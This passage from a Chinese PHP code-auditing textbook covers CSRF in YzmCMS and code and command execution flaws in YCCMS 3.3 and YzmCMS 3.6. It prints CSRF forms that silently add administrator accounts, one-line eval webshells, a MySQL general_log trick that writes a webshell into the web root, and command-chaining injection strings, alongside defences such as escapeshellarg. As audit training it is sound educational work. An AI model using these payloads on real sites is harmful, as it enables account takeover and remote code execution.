　　<body><img src="zj.jpg"/>

  <FORM action="**http://127.0.0.1/admin/admin_users.php?act=add_users_save**" method="**POST**" id="transfer" name="transfer">

　　　 <input type="hidden" name="**admin_name**" value="test_123">

　　　　<input type="hidden" name="**email**" value="test@test.com">

　　　　<input type="hidden" name="**password**" value="123456">

　　　　<input type="hidden" name="**password1**" value="123456">

　　　　<input type="hidden" name="**rank**" value="1">

　　　　<input type="hidden" name="**submit3**" value=%CC%ED%BC%D3>

​    <button type="submit" value="Submit">进入领取大奖！</button></FORM>

　　</body></html>



将上述页面csrf.html存放于网站的根路径C:/PhpStudy/PHPTutorial/WWW下，然后在不更换浏览器的情况下，访问上述HTML页面，如图5-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image308.jpg)

图5-8 CSRF陷阱页面

如果目标点击“进入领取大奖”按钮，然后返回后台管理员界面，发现此时系统被添加了一个用户名为test_123，密码为123456的管理员用户，如图5-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image310.jpg)

图5-9 添加用户页面

### 5.4.2  实验：YzmCMS5.8 CSRF审计

· 实验介绍

本实验将对YzmCMS5.8进行代码审计工作，审计该CMS中会员管理中的用户添加模块是否存在CSRF漏洞，通过CSRF漏洞构造攻击POC，在管理员登录状态下触发恶意代码添加用户hacker。

· 预备知识

1）参考5.2.2节：POST型CSRF漏洞；5.3.1节：验证HTTP Referer字段。

2）YzmCMS的整体架构

目录yzmcms/application中包括模块名为：admin、adver、banner等，其对应着该CMS中不同的模块应用代码，例如：admin模块则对应该CMS的管理员模块。

以admin模块为例，admin目录包含以下文件夹：

l Common：该目录下包含admin模块使用的公用函数，方便统一管理及调用，例如：数据库连接操作文件等。

l View：该目录下包含admin模块使用的前台html页面；

l Model：该目录下包含admin模块使用的对象及其初始化过程，例如：管理员对象的定义及初始化；

l Controller：该目录下包含admin模块的业务逻辑后台php代码，例如：会员管理功能逻辑等。

· 实验目的

掌握CSRF的审计方法。

· 实验环境

Windows操作系统主机；YzmCMS5.8安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

Ø 登录状态审计

审计管理员类文件application\admin\controller\common.class.php，代码如图5-10所示。__construct为Common类的构造函数，其流程为：

l 调用check_admin函数查看管理员是否已经登录；

l 调用check_priv函数检查当前用户的权限判定；

l 调用check_ip函数检查后台IP地址禁止判断操作。

检查用户登录状态使用check_admin函数，由于CSRF漏洞要求用户处于登录状态，绕过该函数是利用CSRF漏洞的条件之一，因此审计函数check_admin。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image312.jpg)

图5-10 common类构造函数

check_admin函数用于检查用户是否处于登录状态，该函数流程为：

l 判断该函数的调用是否从admin/index/login请求而来，若是则返回true；

l 否则，检查Session中adminid和roleid字段与值是否存在，若不存在则页面跳转到admin/index/login重新登录。

l 若Session中adminid和roleid字段与值都存在，则调用check_referer函数。该函数用于查看HTTP请求中的referer情况，需审计check_referer函数。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image314.jpg)

图5-11 check_admin函数

check_referer函数只判断HTTP_REFERER存在且其值与主机名不同时才拒绝访问，这段代码明显存在逻辑漏洞。如果发送的HTTP请求中HTTP_REFERER不存在，该函数最终也返回true。因此，构造的Payload可以不包括Referer字段或Referer字段为主机名，从而完成CSRF漏洞的利用。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image316.jpg)

图5-12 check_referer函数

Ø 添加用户功能的CSRF漏洞审计

本实验以用户添加功能模块为例，审计该模块功能是否存在Token校验，从而确定该网站是否存在CSRF漏洞。

首先查看用户添加前台页面yzmcms\application\member\**view**\member_add.html。该页面代码中FORM表单将触发dosub函数。需要对审计dosub函数进行审计，如图5-13所示，该函数调用U函数执行后台member\controller\member.class.php的add方法添加用户。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image318.jpg)

图5-13 dosub函数代码

审计member.class.php中的add方法用来添加用户，该函数方法并未对用户的token进行检验。至此YzmCMS系统的用户添加功能无token校验，且Referer校验存在漏洞，可尝试利用该模块的CSRF漏洞添加用户，分析流程图5-14所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image320.jpg)

图5-14 分析流程图

（2）  测试利用阶段

制作用户点击的恶意网站页面，该网页用于提交增加用户功能，设计的HTML页面为增加用户的FORM表单，提交HTTP的POST请求，且请求路径为：http://127.0.0.1/yzmcms/member/member/add.html。用户名为hacker，密码为hacker。页面名称为csrf2.html且内容如下：



<!DOCTYPE html><html lang="en">

<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta name="referrer" content="never">

<title>Document</title></head><body>

<FORM action="**http://127.0.0.1/yzmcms/member/member/add.html**" method="post">

<input type="hidden" name="username" value="hacker">

<input type="hidden" name="password" value="hacker">

<input type="hidden" name="nickname" value="hacker">

<input type="hidden" name="email" value="hacker@hacker.com">

<input type="hidden" name="groupid" value="1">

<input type="hidden" name="point" value="0">

<input type="hidden" name="overduedate" value="">

<input type="hidden" name="dosubmit" value="1"></FORM>

<script>

**let oFORM = document.querySelector('FORM');**

**oFORM.submit();**

</script>

</body></html>



  将上述页面csrf2.html存放于网站的根路径C:/PhpStudy/PHPTutorial/WWW下，然后在不更换浏览器且管理员处于登录情况下，访问上述HTML页面路径为http://127.0.0.1/scrf2.html，触发添加用户，显示如图5-15结果。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image322.jpg)

图5-15 添加用户结果1

管理员重新刷新页面，查看会员列表，发现已经添加用户hacker，如图5-16所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image324.jpg)

图5-16 添加用户结果2

## 5.5 单元小结

本单元主要学习了代码审计中的CSRF漏洞，通过对GET型和POST型漏洞介绍，使读者熟悉审计CSRF漏洞的方法。本单元要求读者着重掌握各类CSRF注入漏洞的PHP代码形式，并通过对小型CMS的代码走读审计代码中存在的CSRF漏洞。



 

# 单元6 代码执行与命令执行漏洞审计

本单元介绍了代码审计中代码执行漏洞与命令执行漏洞审计，其主要分为四个部分进行介绍。

第一部分介绍代码执行漏洞与命令执行漏洞的基础知识，包括：漏洞常见函数的代码分析。

第二部分介绍代码执行漏洞与命令执行漏洞的审计方法。使用全局搜索功能对高危函数的传参进行分析，并对传参使用敏感函数参数回溯法分析传参过程及函数调用栈。

第三部分介绍代码执行漏洞与命令执行漏洞的常见防御机制。

第四部分使用YCCMS3.3、YzmCMS3.6、Discuz1.5进行代码执行漏洞与命令执行漏洞进行审计实践。

**单元概述：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image326.jpg)

**单元目标：**

\1.  熟悉代码执行漏洞与命令执行漏洞的常见高危函数；

\2.  了解代码执行漏洞与命令执行漏洞的挖掘技巧；

\3.  掌握代码执行漏洞与命令执行漏洞的常见代码审计方法；

\4.  掌握代码执行漏洞与命令执行漏洞的防御方法。

## 6.1 代码执行漏洞挖掘

### 6.1.1 代码执行漏洞简介

  代码执行漏洞是指应用程序本身过滤不严格，用户可以通过HTTP请求将代码注入到应用中并执行恶意操作，代码执行漏洞可导致攻击者将代码注入到应用中最终在Web服务器执行。这样的漏洞如果未对传参进行严格过滤，则相当于一个Web后门，常见的代码执行漏洞的PHP函数包括：eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()、create_function()等。除此之外，PHP的动态函数也是目前代码执行漏洞发生较多的位置。

### 6.1.2 代码执行漏洞常见函数

本小节将对常见代码执行漏洞函数进行介绍。

（1）  eval函数

该函数将字符串作为PHP代码执行，代码如下：



<?php @eval($_GET[a])?>



  上述代码为常见一句话木马，通过HTTP的GET方式传参，将传参以PHP命令执行，发送HTTP请求路径：http://ip/commond-labs/eval.php?a=phpinfo();代码执行结果如下图6-1所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image328.gif)

图6-1 eval代码执行结果

（2）  assert函数

assert函数的用法：

bool assert(mixed $assertion [,Throwable $exception])

该函数会检查其传参assertion，如果assertion是字符串，它会被assert函数当作PHP代码执行。代码如下：



<?php @assert($_GET[a])?>



  上述代码为一句话木马变形，通过HTTP的GET方式传参，将传参以PHP命令执行，发送HTTP请求路径：http://ip/commond-labs/assert.php?a=phpinfo();执行结果如图6-2所示。值得注意的是在PHP7.0.29以后，assert函数将不再支持动态调用。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image330.gif)

图6-2 assert代码执行结果

（3）  call_user_func函数

call_user_func函数将第一个参数作为回调函数进行调用，其余参数作为回调函数的参数进行传参。代码如下：



<?php call_user_func($_GET['fun'],$_GET['arg']);?>



  上述代码为一句话木马变形，通过HTTP的GET方式传递两个参数，分别是函数名system及传递参数whoami。这样将执行php代码system(‘whoami’);，执行效果如图6-3所示，其打印了当前主机名称。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image332.jpg)

图6-3 call_user_func代码执行结果

（4）  call_user_func_array函数

call_user_func_array函数将第一个参数作为回调函数进行调用，把参数数组作为回调函数的参数传入。代码如下：



<?php

$array[0] = $_GET['arg'];

call_user_func_array($_GET['fun'],$array);?>



  与上述call_user_func函数类似，唯一不同的是call_user_func_array函数需传递数组，而不是字符串。下图为使用system函数参数为whoami，查看当前用户信息。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image334.jpg)

图6-4 call_user_func_array代码执行结果

（5）  create_function函数

create_function函数根据传递参数创建匿名函数，并为匿名函数返回唯一名称。该函数用法如下:

string create_function(string $args,string $code)参数args为要创建的函数参数，参数code为匿名函数内的代码。代码如下：



<?php

$price = $_GET['price'];

$code = 'echo $name.'.'的价格是'.$price.';';

$b = create_function('$name', $code);

$b('iphone');?>



create_function函数会创建虚拟函数，创建后的虚拟函数为：



function b($name){

 echo $name.'.'的价格是'.$price;}



当HTTP请求传递参数price为123;}phpinfo();/*时，将拼接b函数的内容并执行phpinfo函数,图6-5为执行结果。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image336.gif)

图6-5 create_fucntion代码执行结果

（6）  array_map函数

array_map函数为数组的每个元素应用回调函数。该函数用法如下:

string array_map(callable $callback,array $array[array,array2……])

array_map函数返回为每个数组元素应用callback函数之后的数组。callback函数形参的数量和传给array_map函数的数组的数量必须相同。代码如下：



<?php

$func = $_GET['func'];

$argv = $_GET['argv'];

$array[0] = $argv;

array_map($func,$array);?>



  输入HTTP请求为http://ip /array_map.php?func=system&argv=whoami将执行函数system(‘whoami’)打印主机信息，如图6-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image338.gif)

图6-6 assert代码执行结果

（7）  preg_replace函数

preg_replace函数执行一个正则表达式的搜索与替换，为数组的每个元素应用回调函数。该函数用法如下:

preg_replace(mixed $pattern,mixed $replacement, mixed $subject)

preg_replace函数将搜索subject中匹配pattern的部分，用replacement进行替换。值得注意的是：当为pattern部分为/e时会作为php代码进行执行，下面给出代码：



<?php

$a = $_GET['a'];

$b = preg_replace("/abc/e",$a,'abc');?>



输入HTTP请求为http://ip/preg_replace.php?a=phpinfo();将以HTTP的GET方式获取参数a的值为phpinfo();并替换abc同时执行，如图6-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image340.gif)

图6-7 preg_replace代码执行结果

（8）  可变函数执行

PHP支持可变函数的概念，如果一个变量名后有圆括号，例如：$a()。PHP将寻找与变量值相同的函数，并且尝试执行。这就意味着在PHP中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态的调用函数。

下面给出可变函数执行代码：



<?php

function echoit($string){

  echo $string;}

$func=$_GET['func'];

$string=$_GET['string'];

echo $func($string);?>



输入HTTP请求为http://ip/changefun.php?func=system&string=whoami将以HTTP的GET方式获取函数名称为system、函数参数为whoami，如图6-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image342.gif)

图6-8 可变函数代码执行结果

（9）文件包含引起代码执行

文件包含漏洞可以与代码执行漏洞联用，当PHP文件存在文件包含漏洞时，例如：<?php include($_GET[‘a’])?>。

若payload为：http://ip/test.php?a=data:text/plain,<?php phpinfo();?>则可以中PHP命令。

### 6.1.3 代码执行漏洞审计经验

本小节给出代码执行漏洞在审计过程中的经验：

l 对常见代码执行漏洞函数进行审计，着重审计函数如表6-1所示。

表6-1 代码执行漏洞审计函数表

| 函数                                     | 代码执行漏洞问题                                             |
| ---------------------------------------- | ------------------------------------------------------------ |
| eval() /assert()                         | 当载入缓存或模板，对变量过滤不严导致代码执行漏洞             |
| preg_replace()                           | 该函数若使用e修饰符则对变量是否严格过滤                      |
| call_user_func()  call_user_func_array() | 在很多框架中使用此类函数进行动态调用函数，此类函数代码执行漏洞较少 |
| array_map()/create_function()            | 其他函数的传参过滤是否严格                                   |

l 对可变函数进行着重审计

PHP代码中可变函数的过滤是否严格，基于此类写法可变形出多种Web后门。例如：$_GET($_POST[“xx”])。

### 6.1.4 代码执行漏洞防御

本小节给出代码执行漏洞的防御方法，其主要包括如下几点：

l 对于必须使用eval、assert等函数执行代码时，应严格控制用户输入参数内容，可使用黑名单、白名单、正则表达式进行过滤从而防御代码执行漏洞。

l 尽量放弃使用preg_replace的e修饰符，若必须使用此方法则务必使用的单引号包裹正则匹配的输出参数，即preg_replace与正则表达式结合使用。

l 对于传递的可控代码，应务必使用单引号进行保护，并在执行前使用函数addslashes、魔术引号、htmlspecialchars、htmlentities、mysql_real_escap_string、escapeshellarg等进行保护。

l 使用safe_mode_exec_dir来执行可执行文件的路径，在代码开发阶段将会使用的命令提前放入此路径内，例如：



<?php

safe_mode=on

safe_mode_exec_dir=/usr/local/php/bin/

?>



## 6.2 代码执行漏洞审计实践

### 6.2.1 YCCMS3.3代码执行漏洞审计

· 实验介绍

本实验将对YCCMS3.3进行代码审计工作，审计该CMS中管理员首页模块中是否存在代码执行漏洞。通过该应用中Factory类的file_exists存在的Bug执行eval函数，完成代码执行漏洞。

· 预备知识

参考6.1.1节：代码执行漏洞简介；6.1.2代码执行漏洞常见函数；6.1.3代码执行漏洞审计经验。

· 实验目的

掌握代码执行漏洞的审计方法。

· 实验环境

Windows操作系统主机；YCCMS3.3安装包；PhpStorm工具。

· 实验步骤

（1） 审计阶段

点击展开左侧admin目录，在弹出的下拉列表中双击index.php页面，右侧页面可以看到相关代码，如图6-9所示。代码中包含/config/run.inc.php文件。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image344.jpg)

图6-9 index.php代码

图6-10为config\run.inc.php文件代码，其流程为：

l 进行初始化一些常量和配置，包括：session开启情况、超时时间、编码设置等。

l 当进行初始化类且该类不存在时，系统会自动调用autoload函数加载所需类名。

l 最后调用Factory类的setAction方法，包含/public/class/Factory.class.php文件，因此审计Factory.class.php文件内容。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image346.jpg)

图6-10 run.inc.php代码

Factory.class.php是Factory类的定义文件，如图6-11所示。该文件包括方法是：setAction、setModel、getA。setAction()函数流程为：

l 调用getA()方法获取GET传输的参数a并赋值给变量a。

l 利用in_array()函数进行检查，如果$_a的值包含数组中的关键字且Session中不包含admin，则页面将跳转到http://ip?a=login页面。

l file_exists()函数检查路径“/controller/$a.’Action.class.php’”文件是否存在，若不存在则将$_a赋值成index，使其跳转到index页面。

l eval('self::$_obj = new '.ucfirst($_a).'Action();')函数执行PHP代码，调用ucfirst函数将变量$_a转换为大写。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image348.jpg)

图6-11 Factory.class.php文件代码

能够让eval成功执行代码，需要满足两个条件，分别是：

l $_a变量用户可控；

l 成功绕过file_exists函数校验。

file_exists函数作用是检查/controller/$a.’Action.class.php’文件是否存在，但是该函数在进行检查时会存在一个漏洞。即：如果传递参数$a的值为admin;/../，拼接后的字符串为/controller/admin;/../Action.class.php。

file_exists函数允许路径中有特殊字符，并且遇到/../会返回到上级目录，从而判断结果为True。可利用该策略绕过file_exists（）函数检查，最后利用eval函数执行多条语句，例如：eval(echo 1;echo 2;);可以成功执行echo 1和echo 2两条语句。

至此分析出该CMS首页存在的代码执行漏洞，分析结果如图6-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image350.jpg)

图6-12 CMS代码执行漏洞分析图

（2） 测试利用阶段

漏洞页面为http://192.168.0.11/admin/index.php，请求页面如图6-13所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image352.gif)

图6-13 漏洞页面

上述URL后面输入Payload:?a=Factory();phpinfo();//../访问效果如图6-14所示。

该Payload可以将self::$_obj = new '.ucfirst($_a).'Action();代码拼接为self::$_obj = new FACTORY();PHPINFO();//../ACTION();其被分割为三段PHP代码执行：

l 新建FACTORY对象：self::$_obj = new FACTORY();

l 打印PHP信息：PHPINFO();

l 调用上一级的ACTION方法：//../ACTION();

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image354.gif)

图6-14 代码执行结果图

### 6.2.2 YzmCMS3.6代码执行漏洞审计

· 实验介绍

本实验将对YzmCMS3.6进行代码审计工作，审计该CMS中系统管理模块中SQL命令行功能是否存在代码执行漏洞。通过绕过该功能后台代码定义的非法字符串检验功能，从而为该CMS写入代码执行恶意代码从而控制服务器。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image356.jpg)

图6-15 YzmCMS3.6的SQL命令功能

· 预备知识

参考6.1.1节：代码执行漏洞简介；6.1.2节：代码执行漏洞常见函数；6.1.3节：代码执行漏洞审计经验。

· 实验目的

掌握代码执行漏洞的审计方法。

· 实验环境

Windows操作系统主机；YzmCMS3.6安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

application\admin\view\sql.html文件存在一个FORM表单，代码如图6-16所示。该页面功能为执行SQL语句，其通过在input标签中点击“执行单条SQL”按钮触发setaction方法传递参数single。setaction方法为一段JS代码，其主要作用是将action参数赋值为single并对application\admin\controller\sql.class.php类进行初始化。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image358.jpg)

图6-16 执行SQL语句功能前台代码

sql.class.php文件代码如图6-17所示，该SQL类的初始化方法流程：

l 首先程序判断模式引号函数MAGIC_QUOTES_GPC是否开启，若未开启则对参数sqlstr值使用stripslashes函数过滤。

l 检查$sqlstr变量中是否存在非法字符串包括：

  包含outfile的字符串；

  包含.php的字符串；

  匹配正则表达式为/^drop(.*)database/i的字符串，

若存在非法字符串则打印错误信息，否则执行SQL语句。该功能存在漏洞，可以通过构造payload绕过sql.class.php文件中的检测算法，然后使用MySQL功能写入木马，从而构造存在代码执行漏洞PHP语句，获取服务器信息或控制服务器。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image360.jpg)

图6-17 sql.class.php文件代码

（2）  测试利用阶段

虽然outfile关键字被禁止，但可以使用SQL语句向该CMS日志中写入恶意文件。若写入脚本文件以.php结尾，则会被检测为非法字符串。因此，使用MySQL中的concat函数连接字符串从而绕过检测。例如：CONCAT(“test.”,“php”)则会绕过检测机制并拼接为test.php文件。

下面给出本CMS使用的Payload:

l show variables like '%general%';  #查看MySQL日志配置

l set global general_log=on;   #设置开启general log模式

l set global general_log_file=CONCAT("D:\\Program Files\\PhpStudy\\PHPTutorial\\WWW\\YzmCMS\\test.","php");#设置MySQL的Log日志文件名称为test.php

l select '<?php eval($_GET[cmd]);?>';#写入shell

执行上述语句，则可在网站根路径下生成test.php文件为MySQL的日志文件。然后写入木马文件<?php eval($_GET[cmd]);?>，如图6-18所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image362.jpg)

图6-18 test.php文件

通过浏览器访问该日志文件，输入的URL为：http://192.168.0.11/yzmcms/test.php?cmd=phpinfo();浏览器成功访问创建的MySQL日志文件test.php，并进行代码执行漏洞打印PHP信息，如图6-19所示

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image364.jpg)

图6-19 代码执行结果

## 6.3 命令执行漏洞挖掘

命令执行漏洞的问题在于对常见敏感函数传参未严格过滤，导致用户可通过参数构造恶意命令并执行。该漏洞将造成信息泄露、恶意脚本注入等安全问题。本节将对命令执行漏洞审计进行详细介绍，首先对命令执行漏洞常见函数进行代码案例，然后介绍命令执行漏洞中常见的连接符问题，最后以Discuz1.5命令执行漏洞（CVE-2018-14729）为案例给出代码审计过程。

### 6.3.1 命令执行漏洞简介

命令执行漏洞是指可以执行系统指令的漏洞（Windows的cmd指令、Linux的bash指令），该漏洞产生的主要原因是对于一些命令执行函数过滤不严格，从而导致用户将恶意命令注入到服务器内部执行，其常见的命令执行函数包括：system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()函数，除此之外，反引号（`）也可以执行命令，不过反引号方式也是调用的shell_exec()函数。PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大。

### 6.3.2 命令执行漏洞常见函数

本小节将对常见命令执行漏洞函数进行介绍。

（1）  system函数

该函数将执行一个外部应用程序的输入并显示输出结果，代码如下：



<?php

$a = $_GET['a'];

system($a);?>



  上述代码首先通过GET方式传递参数a，然后使用system函数执行系统命令。当输入的URL为：http://192.168.0.11/inject-labs/system.php?a=ipconfig，命令执行结果如图6-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image366.jpg)

图6-20 system执行结果

（2）  shell_exec函数

该函数是PHP的内置函数，通过shell执行命令并以字符串的形式返回结果。该函数将只接受单个参数，参数为要执行的指令。代码如下：



<?php

$output = shell_exec($_GET['a']);

echo "<pre>$output</pre>";?>



上述代码首先通过GET方式传递参数a，然后输出shell_exec函数执行系统命令。当输入的URL为：http://192.168.0.11/inject-labs/shellexec.php?a=ipconfig，命令执行结果如图6-21所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image368.jpg)

图6-21 shell_exec执行结果

（3）  exec函数

该函数是PHP的内置函数，其用于执行外部程序。exec()函数默认不输出结果，只返回输出的最后一行，函数如果没有正确运行命令，则返回NULL。代码如下：



<?php

$output = exec($_GET['a']);

echo $output;?>



上述代码首先通过GET方式传递参数a为whoami，然后输出exec函数执行系统命令。当输入的URL为：http://192.168.0.11/inject-labs/exec.php?a=whoami，命令执行结果如下图6-22所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image370.jpg)

图6-22 exec执行结果

（4）  passthru函数

该函数将执行外部命令同时显示，其不需要使用echo或return来查看结果，其结果将直接在浏览器上打印。代码如下：



<?php

if (get_magic_quotes_gpc())

{$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);}

print passthru($_REQUEST["cmd"]);?>



上述代码首先通过GET方式传递参数a为ipconfig，然后输出passthru函数执行系统命令。当输入的URL为：http://192.168.0.11/inject-labs/newhack.php?cmd=ipconfig，命令执行结果如图6-23所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image372.jpg)

图6-23 passthru执行结果

（5）  popen函数

popen函数用于打开进程文件指针，其主要用法为：

resource popen(string $command, string $mode)。代码如下：



<?php popen("echo 1 > test.txt","r");?>



执行上述代码后，会在当前文件夹下创建test.txt文件。访问的URL为：http://192.168.0.11/inject-labs/popen.php。执行成功后查看test.txt文件如图6-24所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image374.jpg)

图6-24 查看test.txt图

（6）  proc_popen函数

proc_open函数用于执行一个命令，并且打开用来输入输出的文件指针。其用法如下：

resource proc_open(string $cmd, array $descriptorspec, array &$pipes[, string $cwd[, array $env[, array $other_options]]])。代码如下：



<?php $proc=proc_open("whoami",

array(

  array("pipe","r"),

  array("pipe","w"),

  array("pipe","w")

),$pipes);

print stream_get_contents($pipes[1]);?>



执行上述代码后，会执行whoami命令并显示结果，访问的URL为：http://192.168.0.11/inject-labs/proc_popen.php。执行php代码后如图6-25所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image376.jpg)

图6-25 proc_popen执行结果

（7）  反单引号

反单引号（`）是PHP执行运算符，PHP将尝试将反单引号中的内容作为shell命令来执行，并将其输出信息返回。代码如下：



<?php echo `whoami`;?>



执行上述代码后，会执行whoami命令并显示结果，访问的URL为：http://192.168.0.11/inject-labs/fandanyinhao.php。执行php代码如图6-26所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image378.jpg)

图6-26 反引号执行结果

### 6.3.3 命令执行漏洞连接符

（1）Windows连接符

Windows系统下的连接符主要包括：&、&&、|、||。本小节将对命令注入漏洞常用的Windows连接符进行介绍，表6-1为Windows连接符表。

表6-1 Windows连接符表

| **连接符** | **解释**                                                     |
| ---------- | ------------------------------------------------------------ |
| &          | &前面的命令为假则执行&后的命令，&前面的命令为真则&前后的语句都执行。 |
| &&         | &&前面的命令为假则直接报错，&&前面的命令为真则前后命令都执行。 |
| \|         | \|前面的命令为假则直接报错，\|前面的命令为真则执行\|后面的命令。 |
| \|\|       | \|\|前面的语句为假则执行\|\|后面的语句，\|\|前面的语句为真则只执行\|\|前面的语句不执行\|\|后面的语句。 |

下面给出使用案例。



**C:\>aaa & whoami**

'aaa' 不是内部或外部命令，也不是可运行的程序或批处理文件。

an-pc\an

**C:\>aaa && whoami**

'aaa' 不是内部或外部命令，也不是可运行的程序或批处理文件。

**C:\>aaa | whoami**

'aaa' 不是内部或外部命令，也不是可运行的程序或批处理文件。

**C:\>aaa || whoami**

'aaa' 不是内部或外部命令，也不是可运行的程序或批处理文件。

an-pc\an



（2）Linux连接符

Linux系统下的连接符主要包括：;、&、&&、|、||。本小节将对命令注入漏洞常用的Linux连接符进行介绍，表6-2为Linux连接符表。

表6-2 Linux连接符表

| **连接符** | **解释**                                                     |
| ---------- | ------------------------------------------------------------ |
| ;          | 多个命令按顺序执行，所有命令都会执行。                       |
| &          | &的作用是使命令在后台运行，这样就可以同时执行多条指令        |
| &&         | 如果前面的命令执行成功，则执行后面的命令                     |
| \|         | 将前面的命令输出作为后面的命令的输入，前面的命令和后面的命令都会执行，但是只显示后面的命令的执行结果。 |
| \|\|       | 类似于程序中if else语句，若前面的命令执行成功，则后面的命令就不会执行，若前面的命令执行失败则执行后面的命令。 |

下面给出使用案例。



**[root@localhost ~]# aaa;id**

-bash: aaa: command not found

uid=0(root) gid=0(root) groups=0(root)

**[root@localhost ~]# aaa&id**

[1] 1639 -bash: aaa: command not found

uid=0(root) gid=0(root) groups=0(root)    [1]+ Exit 127    aaa

**[root@localhost ~]# aaa&&id**

-bash: aaa: command not found

**[root@localhost ~]# aaa|id**

-bash: aaa: command not found

uid=0(root) gid=0(root) groups=0(root)

**[root@localhost ~]# aaa||id**

-bash: aaa: command not found

uid=0(root) gid=0(root) groups=0(root)



### 6.3.4 命令执行漏洞审计经验

代码审计过程中，审计命令指令漏洞的方法通常是对应用程序代码进行全局搜索以下函数：system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()等。当后台应用调用上述函数执行系统脚本时，极有可能出现编码疏忽而导致的此类漏洞。由于该漏洞的特征较为明显，可直接全部搜索敏感函数并分析是否存在可控变量导致命令执行即可。

### 6.3.5 命令执行漏洞防御

（1）  disable_functions配置防御

通过PHP配置文件中的disable_functions禁用敏感函数来修复命令执行漏洞。

（2）  escapeshellarg函数

escapeshellarg函数把字符串转码为可以在shell命令里使用的参数，以过滤命令中的参数，其用法如下：

string esacpeshellarg(string $arg)

escapeshellarg函数给字符串增加一个单引号，并且能引用或转义任何已经存在的单引号，这样可以直接将一个字符串传入shell函数，并且可以确保它是安全的。对于用户输入的参数就应用使用这个函数。Shell函数包含exec()，system()执行运算符。

通过escapshellarg函数对示例代码进行修复：



<?php

$ip = $_GET['ip'];

system("ping -n 3 ".escapeshellarg($ip));?>



  当输入正常参数，可以返回正常结果，如图6-27所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image380.jpg)

图6-27代码执行结果

当输入恶意攻击参数，不能正常返回结果，如图6-28所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image382.jpg)

图6-28 代码执行结果

（3）  escapeshellcmd函数

escapeshellcmd函数可以对shell元字符进行转义，过滤命令。其用法如下：

string escapeshellcmd(string $command)

escapeshellcmd函数对字符串中会欺骗shell执行恶意命令的字符进行转义。此函数保证用户输入的数据在传送到system函数或者执行操作符之前被转义。

escapeshellcmd函数会在特殊字符前插入反斜线（\），特殊字符包括：&、#、; 、`、|、*、? 、~、<、>、^、(、) 、[、] 、{、}、$、\、\x0A和\xFF。在Windows平台下所有字符以及%和!字符都将被空格代替。

通过escapeshellcmd函数对示例代码进行修复：



<?php

$ip = $_GET['ip'];

system(escapeshellcmd("ping -n 3 ".$ip));?>



当输入恶意攻击参数为ip=127.0.0.1||whoami时，该参数将在执行前转换为ip=127.0.0.1\|\|whoai，导致不能正常返回结果，如图6-29所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image384.jpg)

图6-29 代码执行结果

